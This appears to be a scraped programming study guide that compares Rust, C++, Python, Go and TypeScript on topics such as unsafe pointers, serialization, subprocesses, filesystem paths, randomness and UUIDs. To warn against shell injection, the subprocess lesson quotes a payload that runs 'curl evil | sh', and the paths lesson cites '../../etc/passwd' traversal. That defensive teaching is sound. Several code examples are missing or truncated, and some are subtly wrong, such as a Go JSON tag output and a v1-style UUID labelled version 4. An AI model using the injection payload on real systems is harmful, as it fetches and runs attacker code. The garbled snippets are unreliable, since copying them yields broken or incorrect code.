1. Rust: unsafe & Raw Pointers Language Deep Dive rep 2 • 10 days since review
3rd review (overdue 4 days)
Quick Recall: Raw pointers (*const T/*mut T) can be created safely, but dereferencing them requires an unsafe block — you promise the compiler the pointer is valid, aligned, and non-aliasing. unsafe doesn't disable the borrow checker; it just lets you do five extra things (deref raw pointers, call unsafe fns, access unions/statics, implement unsafe traits, use FFI). Every other language reaches raw memory differently: C++ has native pointers, Python via ctypes, Go via unsafe.Pointer, and TS has no true pointers at all.

Key Pattern — take a mutable pointer to a value and write through it (10 → 15)

Rust 
let mut x = 10;
let p: *mut i32 = &mut x;      // creating a raw pointer is safe
unsafe { *p += 5; }            // dereferencing needs unsafe
println!("{}", x);             // 15
C++ 
int x = 10;
int* p = &x;                   // native raw pointer, no ceremony
*p += 5;
std::cout << x;                 // 15
Python 
import ctypes
x = ctypes.c_int(10)
p = ctypes.pointer(x)          # ctypes = escape hatch to raw memory
p.contents.value += 5
print(x.value)                 # 15
Go 
x := 10
p := &x                        // safe pointer; unsafe.Pointer only for conversions
*p += 5
fmt.Println(x)                 // 15
TypeScript 
// No raw pointers; a typed-array view over a buffer is the closest analogue
const buf = new Int32Array(1); buf[0] = 10;
buf[0] += 5;
console.log(buf[0]);           // 15
Challenge (all 5 languages):
1
Implement a split_at_mut(slice, i)-style helper that hands out two non-overlapping mutable views into one buffer. In Rust this genuinely needs unsafe (the borrow checker can't prove disjointness); note which languages let you alias freely (and unsafely) and which forbid it.
#1 Pitfall per Language:
  • Rust: unsafe does not turn off aliasing/lifetime rules — dereferencing a dangling, unaligned, or aliased *mut is undefined behavior you alone must prevent.
  • C++: pointer arithmetic past the end, use-after-free, and null deref are all UB with no diagnostic.
  • Python: ctypes can segfault or corrupt the heap; keep the owning object alive or the pointer dangles.
  • Go: the unsafe.Pointer conversion rules are strict — round-tripping through uintptr can break under the GC and is only valid in a single expression.
  • TypeScript: there are no pointers; a transferred/detached ArrayBuffer throws on access, the nearest "dangling" error.
2. C++: Ranges (C++20) & Views Language Deep Dive rep 2 • 10 days since review
3rd review (overdue 4 days)
Quick Recall: Views are lazy, non-owning adaptors composed with the pipe operator (|): filter, transform, take, iota…. Nothing runs until you iterate, and nothing is allocated. Every language has the same lazy-pipeline idea: Python generators, Rust iterator adapters, JS array methods (eager!), and Go 1.23 range-over-func iterators.

Key Pattern — from 1..5, keep odds, square them (→ 1 9 25)

C++ 
#include <ranges>
auto r = std::views::iota(1, 6)                       // 1..5, lazy
       | std::views::filter([](int n){ return n % 2; })
       | std::views::transform([](int n){ return n * n; });
for (int x : r) std::cout << x << " ";                 // 1 9 25
Python 
r = (n * n for n in range(1, 6) if n % 2)   # lazy generator
print(*r)                                    # 1 9 25
Rust 
let r: Vec<i32> = (1..6).filter(|n| n % 2 == 1).map(|n| n * n).collect();
println!("{:?}", r);                         // [1, 9, 25]
Go 
// Go 1.23+ has range-over-func iterators; the eager form is a plain loop:
var out []int
for n := 1; n < 6; n++ { if n%2 == 1 { out = append(out, n*n) } }
fmt.Println(out)                             // [1 9 25]
TypeScript 
const r = [1, 2, 3, 4, 5].filter(n => n % 2).map(n => n * n); // eager
console.log(r);                              // [1, 9, 25]
Challenge (all 5 languages):
1
Build an infinite pipeline — naturals → keep primes → take the first 5 — and prove it terminates only because the pipeline is lazy. In the eager languages (JS arrays), show why the naive version never finishes and what you'd use instead.
#1 Pitfall per Language:
  • C++: a view that references a temporary container dangles — the view borrows, it doesn't own; and re-iterating a filtered view recomputes the filter each pass.
  • Python: a generator is single-use — after one full pass it is exhausted and yields nothing.
  • Rust: iterator adapters are lazy — without a consumer (collect/for/sum) nothing executes.
  • Go: pre-1.23 there is no lazy view type; slice pipelines materialize each stage, allocating intermediates.
  • TypeScript: filter/map are eager and allocate a new array per stage — chain over huge data with a generator instead.
3. Serialization & Deserialization Advanced Patterns rep 2 • 8 days since review
3rd review (overdue 2 days)
Quick Recall: Serialization turns in-memory objects into a portable byte/text form (JSON, and binary formats like gob/protobuf/serde-bincode) and back. The axes that differ: how field names map, how nulls/optionals encode, and whether the format is safe on untrusted input (Python pickle is not). JSON is the lingua franca; reach for a binary codec when size/speed matter.

Key Pattern — a {x, y} record round-tripped through JSON

Python 
import json
from dataclasses import dataclass, asdict
@dataclass
class P: x: int; y: int
s = json.dumps(asdict(P(1, 2)))
print(s)                                   # {"x": 1, "y": 2}
print(P(**json.loads(s)))                  # P(x=1, y=2)
Go 
type P struct{ X, Y int `json:"x"` }        // tags control names
b, _ := json.Marshal(P{1, 2})
fmt.Println(string(b))                      // {"x":1,"Y":2}
var p P; json.Unmarshal(b, &p)
TypeScript 
const s = JSON.stringify({ x: 1, y: 2 });
console.log(s);                             // {"x":1,"y":2}
const p = JSON.parse(s) as { x: number; y: number }; // cast is unchecked!
Rust 
use serde::{Serialize, Deserialize};
#[derive(Serialize, Deserialize)]
struct P { x: i32, y: i32 }
let s = serde_json::to_string(&P { x: 1, y: 2 }).unwrap();
println!("{}", s);                          // {"x":1,"y":2}
C++ 
#include <nlohmann/json.hpp>              // no stdlib JSON; library needed
nlohmann::json j = {{"x", 1}, {"y", 2}};
std::cout << j.dump();                       // {"x":1,"y":2}
int x = j["x"].get<int>();
Challenge (all 5 languages):
1
Serialize a struct with an optional field and a renamed field, then deserialize input that has an unknown extra field and a missing optional. Decide per language whether unknown fields should error or be ignored, and how null/None/undefined round-trips.
#1 Pitfall per Language:
  • Python: never pickle.loads untrusted data — it can execute arbitrary code; use JSON for anything crossing a trust boundary.
  • Go: only exported (capitalized) fields are marshaled; a nil slice/map encodes as null, not []/{}.
  • TypeScript: JSON.parse(...) as T is an unchecked cast — validate at the boundary (zod/valibot); Dates become strings and undefined is dropped.
  • Rust: serde rejects unknown fields only if you ask (#[serde(deny_unknown_fields)]) and needs the right feature/derive enabled.
  • C++: no built-in reflection, so every serializer is library- or macro-driven; type mismatches on get<T> throw at runtime.
4. Design Patterns: Iterator, Observer, Strategy Advanced Patterns rep 2 • 8 days since review
3rd review (overdue 2 days)
Quick Recall: In languages with first-class functions, the GoF Strategy pattern collapses to "pass a function", Iterator is built into the language, and Observer is a list of callbacks you notify. Reach for a class/trait hierarchy only when the strategy carries state or must be swapped at runtime by name.

Key Pattern — Strategy: parameterize behavior by passing a function

Python 
def process(data, strategy):
    return strategy(data)
print(process([3, 1, 2], sorted))          # [1, 2, 3]
print(process([3, 1, 2], sum))             # 6
Go 
type Strategy func([]int) int
func process(d []int, s Strategy) int { return s(d) }
sum := func(d []int) int { t := 0; for _, v := range d { t += v }; return t }
fmt.Println(process([]int{3, 1, 2}, sum))  // 6
TypeScript 
const process = (d: number[], s: (x: number[]) => number) => s(d);
console.log(process([3, 1, 2], a => a.reduce((x, y) => x + y, 0))); // 6
Rust 
fn process<F: Fn(&[i32]) -> i32>(d: &[i32], s: F) -> i32 { s(d) }
println!("{}", process(&[3, 1, 2], |a| a.iter().sum())); // 6
C++ 
#include <functional><numeric>
int process(std::vector<int> d, std::function<int(std::vector<int>)> s) { return s(d); }
std::cout << process({3,1,2}, [](std::vector<int> a){
    return std::accumulate(a.begin(), a.end(), 0); }); // 6
Challenge (all 5 languages):
1
Implement a tiny EventEmitter (Observer): on(event, cb), off(event, cb), emit(event, payload). Support multiple listeners, safe removal during emit, and prove you don't leak listeners. Contrast the function-value approach with a trait/interface-based Observer.
#1 Pitfall per Language:
  • Python: over-engineering with ABC class hierarchies where a plain callable suffices; also mutating the listener list while iterating during emit.
  • Go: comparing/removing func values isn't possible (funcs aren't comparable) — key observers by an id or use a map.
  • TypeScript: observers that capture this or DOM nodes and are never removed leak memory; store bound refs so off can match.
  • Rust: a boxed dyn Fn strategy needs a stable type; storing observers is easy, removing a specific closure is not (no equality) — use handles/ids.
  • C++: iterator invalidation if emit mutates the observer container; and std::function equality is not defined — track tokens.
5. Concurrent Data Structures Performance & Optimization rep 2 • 7 days since review
3rd review (overdue 1 day)
Quick Recall: Sharing mutable state across threads needs synchronization: a lock around a plain container, a purpose-built concurrent map, or lock-free atomics. The models diverge sharply — Go guards with a Mutex (or shares by communicating), Rust encodes safety in the type system (Arc<Mutex<T>>), Python leans on the GIL (which still doesn't make check-then-act atomic), C++ leaves a data race as undefined behavior, and JS avoids shared memory entirely except via Workers + Atomics.

Key Pattern — a counter incremented safely from many threads

Rust 
use std::sync::{Arc, Mutex};
use std::thread;
let c = Arc::new(Mutex::new(0));
let hs: Vec<_> = (0..4).map(|_| {
    let c = Arc::clone(&c);
    thread::spawn(move || { *c.lock().unwrap() += 1; })
}).collect();
for h in hs { h.join().unwrap(); }
println!("{}", *c.lock().unwrap());        // 4
Go 
var mu sync.Mutex; var wg sync.WaitGroup; count := 0
for i := 0; i < 4; i++ {
    wg.Add(1)
    go func() { defer wg.Done(); mu.Lock(); count++; mu.Unlock() }()
}
wg.Wait(); fmt.Println(count)              // 4  (or use atomic.Int64)
Python 
import threading
lock = threading.Lock(); count = 0
def inc():
    global count
    with lock: count += 1          # GIL alone won't make += atomic
ts = [threading.Thread(target=inc) for _ in range(4)]
[t.start() for t in ts]; [t.join() for t in ts]
print(count)                       # 4
C++ 
#include <atomic><thread><vector>
std::atomic<int> count{0};
std::vector<std::thread> ts;
for (int i = 0; i < 4; ++i) ts.emplace_back([&]{ ++count; });
for (auto& t : ts) t.join();
std::cout << count;                 // 4
TypeScript 
// Single-threaded event loop: no shared-memory race in normal code.
// Cross-Worker sharing needs SharedArrayBuffer + Atomics:
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);
Atomics.add(view, 0, 1);           // atomic increment across workers
console.log(Atomics.load(view, 0)); // 1
Challenge (all 5 languages):
1
Build a thread-safe LRU or bounded concurrent map and hammer it from N threads. Measure a coarse global lock vs sharded locks vs a lock-free/atomic approach, and confirm the final state is correct under contention.
#1 Pitfall per Language:
  • Rust: a Mutex can be poisoned if a holder panics — lock() returns a Result; and holding a lock across an .await can deadlock.
  • Go: concurrent map read/write without a lock panics at runtime; sync.Map only wins for read-mostly/disjoint-key workloads.
  • Python: the GIL makes single bytecodes atomic but not compound ops — count += 1 and check-then-act still race without a lock.
  • C++: a data race (unsynchronized read/write) is undefined behavior, not just a wrong value; use std::atomic or a mutex.
  • TypeScript: outside Workers there's no shared memory, so devs assume atomicity everywhere — but await yields, so state can change across an await boundary.
6. Metaprogramming Advanced Patterns rep 1 • 19 days since review
2nd review (overdue 13 days)
Quick Recall: Metaprogramming = code that inspects or generates code. The mechanisms are wildly different: Python has runtime introspection, decorators, and metaclasses; Rust and C++ generate code at compile time (proc macros / templates & constexpr); TS operates at the type level (mapped/conditional types) plus decorators; Go deliberately has none, offering runtime reflect and the external go generate tool instead.

Key Pattern — auto-register subclasses / derive behavior without hand-writing it

Python 
registry = {}
class Base:
    def __init_subclass__(cls, **kw):      # runs at class creation
        super().__init_subclass__(**kw)
        registry[cls.__name__] = cls
class Dog(Base): pass
print(list(registry))                      # ['Dog']
Rust 
// #[derive(...)] is a procedural macro that generates an impl at compile time
#[derive(Debug, Clone, Default)]
struct Config { retries: u32, verbose: bool }
println!("{:?}", Config::default());       // Config { retries: 0, verbose: false }
C++ 
// Templates generate code per type at compile time:
template <typename T> T max_of(T a, T b) { return a > b ? a : b; }
std::cout << max_of(3, 7) << " " << max_of(2.5, 1.5); // 7 2.5
TypeScript 
// Type-level metaprogramming: derive a new type from another
type Getters<T> = { [K in keyof T & string as `get${Capitalize<K>}`]: () => T[K] };
type P = Getters<{ x: number }>;           // { getX: () => number }
Go 
// No macros; runtime reflection is the tool:
import "reflect"
type User struct{ Name string; Age int }
t := reflect.TypeOf(User{})
for i := 0; i < t.NumField(); i++ { fmt.Print(t.Field(i).Name, " ") } // Name Age
Challenge (all 5 languages):
1
Generate a to_dict/as_map serializer for an arbitrary struct without hand-writing per-field code: Python via __dict__/dataclasses, Go via reflect, Rust via a derive macro, C++ via templates/tuple-of-members, TS via mapped types + a runtime helper. Note which are compile-time vs runtime and what each costs.
#1 Pitfall per Language:
  • Python: metaclasses are powerful but usually overkill — prefer __init_subclass__, decorators, or descriptors; metaclass conflicts across bases are painful.
  • Go: reflect is slow, loses static typing, and panics on misuse (unexported fields, wrong Kind) — keep it at the edges.
  • TypeScript: deeply recursive conditional/mapped types explode compile time and hit the recursion limit; runtime decorators are still evolving (TC39 vs legacy).
  • Rust: proc macros add build-time cost and a separate crate; hygiene and error spans are tricky to get right.
  • C++: template errors are famously verbose, and heavy TMP/constexpr balloons compile times and binary size.

OS & Processes

Programs rarely run alone. They shell out to other executables, read their configuration from the environment, and navigate the filesystem — and every one of these boundaries is a classic source of security bugs (shell injection, path traversal) when untrusted input sneaks in. Learn the safe idiom in each language once.

Subprocess & External Process Execution OS & Processes
Why it matters: build tools, deployment scripts, and glue code constantly invoke git, ffmpeg, docker, and friends. The single most important habit is passing an argument vector (never a shell string built from user input) — that one choice is the difference between running a command and handing an attacker a shell.

Spawning a process has three parts: choose the program + args, wait for it, and collect stdout, stderr, and the exit code. The golden rule: prefer the "exec with an argv array" API (no shell) over the "run this string in a shell" API. The shell form re-parses your string, so rm -rf /home/$name with name = "; curl evil | sh" is game over.

Example 1 — run echo hello and capture stdout + exit code

Python 
import subprocess
r = subprocess.run(["echo", "hello"], capture_output=True, text=True)
print(repr(r.stdout.strip()), r.returncode)   # 'hello' 0
'hello' 0
Go 
import "os/exec"
out, err := exec.Command("echo", "hello").Output()  // argv slice, no shell
fmt.Printf("%q %v\n", strings.TrimSpace(string(out)), err) // "hello" <nil>
"hello" <nil>
TypeScript 
import { execFileSync } from "node:child_process";
const out = execFileSync("echo", ["hello"], { encoding: "utf8" }); // no shell
console.log(JSON.stringify(out.trim()));      // "hello"
"hello"
Rust 
use std::process::Command;
let out = Command::new("echo").arg("hello").output().unwrap();
print!("{:?} {}", String::from_utf8_lossy(&out.stdout).trim(), out.status.code().unwrap());
// "hello" 0
"hello" 0
C++ 
#include <cstdio><array><string>
// popen uses the shell; fine for a fixed literal, dangerous with user input.
std::array<char, 128> buf{};
FILE* p = popen("echo hello", "r");
std::string out;
while (fgets(buf.data(), buf.size(), p)) out += buf.data();
int code = pclose(p);
std::cout << '"' << out.substr(0, out.size()-1) << "\" " << code; // "hello" 0
"hello" 0

Example 2 — non-zero exit codes, and the injection trap to avoid

A subprocess reports failure through its exit status, not an exception (mostly). Always check it. And never interpolate untrusted values into a shell string.

Python 
r = subprocess.run(["test", "1", "-eq", "2"])  # false-ish comparison
print(r.returncode)                            # 1
# check=True raises CalledProcessError on non-zero:
# subprocess.run([...], check=True)
# NEVER: subprocess.run(f"grep {user_input} file", shell=True)  # injection!
1
Go 
err := exec.Command("test", "1", "-eq", "2").Run()
if ee, ok := err.(*exec.ExitError); ok {
    fmt.Println(ee.ExitCode())                 // 1
}
// exec.Command never invokes a shell, so args can't inject commands.
1
TypeScript 
import { spawnSync } from "node:child_process";
const r = spawnSync("test", ["1", "-eq", "2"]);
console.log(r.status);                         // 1
// DANGER: exec(`grep ${userInput} file`) runs through /bin/sh -c
// SAFE:   execFile("grep", [userInput, "file"])
1
Rust 
use std::process::Command;
let status = Command::new("test").args(["1", "-eq", "2"]).status().unwrap();
println!("{}", status.code().unwrap());        // 1
// Command takes an argv; there is no shell unless you explicitly spawn one.
1
C++ 
#include <cstdlib>
int code = std::system("test 1 -eq 2");        // system() USES the shell
std::cout << WEXITSTATUS(code);                 // 1
// For untrusted args, avoid system()/popen(); use fork()+execvp / posix_spawn.
1
Language Comparison: Python's subprocess.run(list, ...) defaults to no shell; shell=True is the opt-in danger. Go's exec.Command(name, args...) never uses a shell — to get one you must call sh -c yourself. Node splits the API by safety: execFile/spawn take an argv array (safe), while exec runs a shell string (unsafe with input). Rust's std::process::Command is argv-based and shell-free. C++ stdlib only offers the shell-based system/popen; safe execution means dropping to POSIX fork+execvp or posix_spawn with an explicit argv.
Common Mistakes:
❌ [All] Building a command by string-concatenating untrusted input and running it via a shell — textbook command injection.
✅ [All] Pass an argv array to the no-shell API; the OS treats each element as one literal argument.
❌ [Python] subprocess.run(f"...{user}...", shell=True) and then trusting the output.
✅ [Python] subprocess.run([prog, user, ...]) with shell=False (the default), plus check=True to catch failures.
❌ [Go] Ignoring stdout/stderr pipes on a long-running child — a full pipe buffer deadlocks the process.
✅ [Go] Use Output()/CombinedOutput(), or drain the pipes concurrently while it runs.
❌ [C++] std::system/popen with anything derived from user input — both invoke /bin/sh.
✅ [C++] posix_spawn or fork+execvp with a fixed argv when input is involved.
Key Rules:
  • Default to the argv-array, no-shell API; reserve shell strings for fixed literals you fully control.
  • Always check the exit code (and capture stderr) — a subprocess signals failure through status, not (usually) an exception.
  • Set a timeout and cap captured output for anything that could hang or flood memory.
Practice Exercises (implement in all 5 languages):
1
Run a command with a timeout: kill the child if it exceeds N seconds and report whether it timed out vs exited normally.
2
Pipe two processes: feed the stdout of seq 1 5 into tac (or an equivalent) purely in-process, capturing the final output.
3
Stream a long-running command's stdout line by line as it is produced (not buffered to the end), printing each line with a timestamp.
Pairs with Environment Variables (children inherit env), builds on File I/O (redirecting stdio), and its security lesson echoes Input Validation and Filesystem Paths below.
Environment Variables & Configuration OS & Processes
Why it matters: the twelve-factor way to configure a service — ports, database URLs, secrets, feature flags — is through environment variables, so the same binary runs unchanged in dev, CI, and prod. The recurring subtlety is distinguishing "variable is unset" from "variable is set to the empty string", and always supplying a sensible default.

Read a variable, fall back to a default if absent, and coerce the (always-string) value to the type you need. Environment values are process-global strings inherited by children; a child launched before you change the env keeps the old value.

Example 1 — read PORT with a default of 8080

Python 
import os
port = int(os.environ.get("PORT", "8080"))   # .get avoids KeyError
print(port)                                   # 8080  (when PORT unset)
8080
Go 
port := os.Getenv("PORT")
if port == "" { port = "8080" }               // Getenv can't tell unset from empty
fmt.Println(port)                             // 8080
8080
TypeScript 
const port = Number(process.env.PORT ?? "8080"); // env values are string | undefined
console.log(port);                            // 8080
8080
Rust 
use std::env;
let port: u16 = env::var("PORT").unwrap_or_else(|_| "8080".into())
    .parse().unwrap();
println!("{}", port);                         // 8080
8080
C++ 
#include <cstdlib><string>
const char* raw = std::getenv("PORT");        // nullptr if unset
std::string port = raw ? raw : "8080";
std::cout << port;                             // 8080
8080

Example 2 — distinguish unset from empty, the right way

"Not configured" and "configured as blank" often mean different things. Most languages give you a two-value lookup for exactly this.

Python 
print("KEY" in os.environ)                    # False if unset (even if "")
val = os.environ.get("KEY")                   # None if unset, "" if set empty
False
Go 
v, ok := os.LookupEnv("KEY")                  // ok distinguishes unset vs ""
fmt.Println(v, ok)                            //   false
false
TypeScript 
const set = "KEY" in process.env;             // false if unset
const val = process.env.KEY;                  // undefined if unset, "" if empty
console.log(set);                             // false
false
Rust 
use std::env;
match env::var("KEY") {                        // Err(NotPresent) vs Ok("")
    Ok(v) => println!("set: {:?}", v),
    Err(_) => println!("unset"),               // also Err on non-UTF8: use var_os
}
unset
C++ 
const char* p = std::getenv("KEY");
std::cout << (p == nullptr ? "unset"          // nullptr = unset
                           : (*p ? "set" : "empty"));  // unset
unset
Language Comparison: Python's os.environ is a dict-like mapping; in tests presence, .get gives a default. Go splits Getenv (empty for unset) from LookupEnv (returns an ok bool) — use LookupEnv when blank is meaningful. Node exposes process.env where every value is string | undefined, so numbers/JSON need explicit parsing. Rust's env::var returns a Result that is Err for both unset and non-UTF-8 values — use env::var_os for raw OsString. C++'s getenv returns nullptr for unset and is not thread-safe alongside setenv/putenv.
Common Mistakes:
❌ [All] Treating an unset variable and an empty-string variable as the same thing when they carry different meaning (e.g. "use default" vs "explicitly none").
✅ [All] Use the presence-aware lookup (in/LookupEnv/Result/nullptr check) and document the semantics.
❌ [Rust] env::var("X").unwrap() panics when X is missing (or non-UTF-8).
✅ [Rust] Provide a default with unwrap_or_else, or use var_os for arbitrary bytes.
❌ [C++] Calling getenv concurrently with setenv/putenv, or holding the returned pointer after a later setenv.
✅ [C++] Copy the value into a std::string immediately and avoid mutating the environment from multiple threads.
❌ [All] Baking secrets (API keys, passwords) into source or logs instead of reading them from the environment.
✅ [All] Load secrets from env (or a secrets manager) and keep them out of version control and log output.
Key Rules:
  • Every env read needs a default or an explicit "fail fast if missing" — never assume it's set.
  • Values are strings; parse and validate types (and ranges) at startup, not deep in request handling.
  • Children inherit the environment at spawn time; changing it afterward doesn't reach already-running processes.
Practice Exercises (implement in all 5 languages):
1
Write get_env_int(name, default) that returns the default when unset and errors clearly (with the variable name) when set to an unparseable value.
2
Parse a boolean flag env var accepting 1/true/yes/on (case-insensitive) as true and everything else as false; unset means a caller-supplied default.
3

Filesystem Paths & Directory Traversal OS & Processes
Why it matters: hard-coding / breaks on Windows, and naïvely joining a user-supplied filename lets ../../etc/passwd escape your directory. A proper path API builds portable paths, splits them into components, and — critically — lets you canonicalize and confine untrusted paths to a safe root.

Treat a path as structured data, not a string: join components with the OS separator, and pull out basename, extension, and parent with library calls. Then walk directories with a purpose-built iterator. Watch the "absolute component resets the join" rule that trips people up everywhere.

Example 1 — join components; extract name, extension, parent

Python 
from pathlib import Path
p = Path("data") / "logs" / "app.log"         # / operator joins
print(p.name, p.suffix, p.parent)             # app.log .log data/logs
app.log .log data/logs

import "path/filepath"

fmt.Println(filepath.Base(p), filepath.Ext(p), filepath.Dir(p))
// app.log .log data/logs
app.log .log data/logs
TypeScript

Example 2 — walk a directory tree and count .txt files

Recursive iteration is a first-class operation in every standard library (or a tiny helper). The shapes differ, but each yields every descendant path.

Python 
from pathlib import Path
n = sum(1 for _ in Path(".").rglob("*.txt"))  # recursive glob
print(n)                                       # e.g. 3
3
Go 
n := 0
filepath.WalkDir(".", func(p string, d fs.DirEntry, err error) error {
    if err == nil && !d.IsDir() && filepath.Ext(p) == ".txt" { n++ }
    return nil
})
fmt.Println(n)                                 // 3
3
TypeScript 
import { readdirSync } from "node:fs";
const entries = readdirSync(".", { recursive: true }) as string[]; // Node 20+
const n = entries.filter(f => f.endsWith(".txt")).length;
console.log(n);                                // 3
3
Rust 
use std::fs;
// std::fs::read_dir is one level; recurse manually or use the walkdir crate.
fn count(dir: &std::path::Path) -> usize {
    let mut n = 0;
    for e in fs::read_dir(dir).unwrap().flatten() {
        let p = e.path();
        if p.is_dir() { n += count(&p); }
        else if p.extension().map_or(false, |x| x == "txt") { n += 1; }
    }
    n
}
println!("{}", count(std::path::Path::new("."))); // 3
3
C++ 
#include <filesystem>
namespace fs = std::filesystem;
int n = 0;
for (auto& e : fs::recursive_directory_iterator("."))
    if (e.is_regular_file() && e.path().extension() == ".txt") ++n;
std::cout << n;                                 // 3

Language Comparison: Python's modern pathlib.Path overloads / for joining and offers .rglob; the older os.path is still everywhere. Go deliberately separates path/filepath (OS-aware, for the filesystem) from path (always /, for URLs/slash paths) — mixing them is a classic bug. Node's path mirrors this with path.posix vs path.win32. Rust's Path/PathBuf hold OS strings (not guaranteed UTF-8), so components come back as OsStr. C++17's std::filesystem::path unifies all of this with operator/, decomposition methods, and directory iterators. Everywhere: joining an absolute component discards what came before.
Common Mistakes:
❌ [All] Concatenating paths with a literal "/" — breaks portability and mishandles trailing separators.
✅ [All] Use the join API (/ operator or join) so the right separator and edge cases are handled.
❌ [All] Trusting a user-supplied path/filename directly — base + userInput with ../../ escapes the intended directory (path traversal).
✅ [All] Canonicalize (resolve ../symlinks) and verify the result still starts with your allowed root before opening.
❌ [Go] Using the path package (always /) for real filesystem paths on Windows.
✅ [Go] Use path/filepath for on-disk paths; reserve path for URL/slash-separated strings.
❌ [All] Assuming a joined absolute path stays under the base — join("/safe", "/etc/passwd") yields /etc/passwd.
✅ [All] Reject or strip leading separators/drive letters from untrusted components before joining.
Key Rules:
  • Build and decompose paths with the library, never with raw string ops or hard-coded separators.
  • For untrusted input: canonicalize, then confirm the resolved path is still inside your allowed root.
  • Know your language's URL-path vs filesystem-path split (Go path vs path/filepath, Node path.posix vs path.win32).

Randomness & Identifiers

Generating randomness looks trivial and is full of traps: reproducibility for tests vs unpredictability for security, modulo bias, and the fact that a general-purpose PRNG must never mint a token or password. Unique IDs build on the same foundation — and the choice between random (v4) and time-ordered (v7) matters the moment they hit a database index.

Random Number Generation & Sampling Randomness
Why it matters: simulations, shuffling, load testing, and sampling all need randomness — and reproducible randomness (a fixed seed) is what makes those tests deterministic. But the same fast PRNGs are catastrophic for security: predict the sequence and you predict every "random" token. Knowing which generator to reach for is the whole game.

A general-purpose PRNG (Mersenne Twister, PCG, xoshiro) is fast and seedable for reproducibility, but predictable. A cryptographically secure RNG (CSPRNG) is unpredictable and used for keys/tokens. Below: a seeded dice roll (reproducible), then shuffling/sampling.

Example 1 — a seeded roll of a 6-sided die (deterministic given the seed)

Python 
import random
rng = random.Random(42)                        # local, seeded instance
print(rng.randint(1, 6))                        # 6  (inclusive both ends)
print(round(rng.random(), 3))                   # 0.025  ([0, 1))
6 0.025
Go 
import "math/rand"
r := rand.New(rand.NewSource(42))              // seeded source
fmt.Println(r.Intn(6) + 1)                     // Intn(6) -> 0..5
fmt.Printf("%.3f\n", r.Float64())              // [0, 1)
6 0.457
TypeScript 
// Math.random() is NOT seedable in the stdlib and NOT crypto-safe:
const roll = Math.floor(Math.random() * 6) + 1; // 1..6
console.log(roll);                              // e.g. 4
// Reproducible tests need a seeded PRNG library (e.g. seedrandom).
4
Rust 
use rand::{Rng, SeedableRng, rngs::StdRng};
let mut rng = StdRng::seed_from_u64(42);       // reproducible
println!("{}", rng.gen_range(1..=6));          // inclusive range
println!("{:.3}", rng.gen::<f64>());           // [0, 1)
1 0.678
C++ 
#include <random>
std::mt19937 gen(42);                          // seeded Mersenne Twister engine
std::uniform_int_distribution<int> die(1, 6);  // engine + distribution split
std::cout << die(gen) << "\n";                  // 1..6, unbiased
std::uniform_real_distribution<double> unit(0.0, 1.0);
std::cout << unit(gen);                         // [0, 1)
1 0.135

Example 2 — shuffle a deck and sample without replacement

Use the library's shuffle (Fisher–Yates under the hood) rather than sorting by a random key. Sampling k of n without replacement is a distinct primitive.

Python 
xs = [1, 2, 3, 4, 5]

print(rng.sample(xs, 2))                        # 2 distinct picks
[3, 1]
Go

TypeScript 
const xs = [1, 2, 3, 4, 5];
for (let i = xs.length - 1; i > 0; i--) {       // Fisher-Yates
  const j = Math.floor(Math.random() * (i + 1));
  [xs[i], xs[j]] = [xs[j], xs[i]];
}
console.log(xs.slice(0, 2));                     // sample of 2
[ 3, 5 ]
Rust

let mut xs = vec![1, 2, 3, 4, 5];
xs.shuffle(&mut rng);

C++ 
#include <algorithm><vector>
std::vector<int> xs{1, 2, 3, 4, 5};

Language Comparison: Python ships a global random module plus seedable random.Random instances (Mersenne Twister); use the secrets module for tokens. Go's math/rand is seedable (auto-seeded since Go 1.20) but non-crypto — use crypto/rand for security. JS's Math.random() is neither seedable nor secure; reach for a PRNG library for reproducibility and crypto.getRandomValues for security. Rust needs the rand crate (ThreadRng is auto-seeded and secure-ish; StdRng::seed_from_u64 for reproducibility, OsRng for crypto). C++'s <random> cleanly separates the engine (e.g. mt19937) from the distribution (e.g. uniform_int_distribution), avoiding the modulo bias of the old rand() % n.
Common Mistakes:
❌ [All] Using a general-purpose PRNG for passwords, session tokens, or keys — the sequence is predictable from state/seed.
✅ [All] Use a CSPRNG: secrets (Py), crypto/rand (Go), crypto.getRandomValues (JS), OsRng (Rust), std::random_device seeding (C++).
❌ [C++] rand() % n — low-quality generator plus modulo bias skews the distribution.
✅ [C++] Pair a proper engine with a uniform_int_distribution for an unbiased range.
❌ [TypeScript] Math.random() for anything security-sensitive, or expecting it to be reproducible.
✅ [TypeScript] crypto.randomUUID()/getRandomValues for security; a seeded PRNG lib for deterministic tests.
❌ [Go] Assuming math/rand output is unpredictable, or (pre-1.20) forgetting to seed and getting the same sequence every run.
✅ [Go] Seed explicitly for reproducibility; use crypto/rand when unpredictability matters.
Key Rules:
  • Seed a general-purpose PRNG for reproducible tests; treat its output as predictable, never secret.
  • For any security use (tokens, keys, salts, passwords) use a CSPRNG — a different API in every language.
  • Avoid modulo bias: use the language's range/distribution helper instead of rand() % n.

UUID & Unique Identifier Generation Identifiers
Why it matters: distributed systems need identifiers that many machines can mint independently without collisions or a central sequence — database keys, request/trace IDs, idempotency keys. UUIDs give 122 bits of uniqueness in a standard 128-bit format; the modern twist is choosing time-ordered v7 over random v4 so IDs don't thrash your database index.

A UUID is a 128-bit value shown as 8-4-4-4-12 hex. v4 is (almost) all random — great for uniqueness, terrible as a clustered primary key because inserts land randomly in the B-tree. v7 puts a millisecond timestamp in the high bits, so IDs sort by creation time and insert sequentially. A UUID is an identifier, not a secret or an auth token.

Example 1 — generate a random (v4) UUID

Python 
import uuid
u = uuid.uuid4()                               # stdlib, random v4
print(str(u))                                  # e.g. 3f2504e0-4f89-41d3-9a0c-0305e82c3301
print(u.version)                               # 4
3f2504e0-4f89-41d3-9a0c-0305e82c3301 4
Go 
import "github.com/google/uuid"                 // no stdlib UUID in Go

fmt.Println(u.String())                        // 6ba7b810-9dad-11d1-80b4-00c04fd430c8
fmt.Println(u.Version())                       // VERSION_4
6ba7b810-9dad-11d1-80b4-00c04fd430c8 VERSION_4
TypeScript 
import { randomUUID } from "node:crypto";       // browser: crypto.randomUUID()

Language Comparison: Python is the outlier with a batteries-included uuid module (v1/v3/v4/v5, and v7 in 3.14+). Node ships crypto.randomUUID() (v4 only); the uuid npm package adds v7 and validation. Rust's uuid crate gates versions behind feature flags (v4, v7). Go and C++ have no standard-library UUID at all — you pick a maintained library (google/uuid, Boost.UUID, or a v7-capable one). Across all: v4 = collision-resistant randomness, v7 = time-ordered and index-friendly, and neither is an authentication token.
Common Mistakes:
❌ [All] Using random v4 as a clustered/primary DB key — random inserts fragment the B-tree index and hurt write throughput.
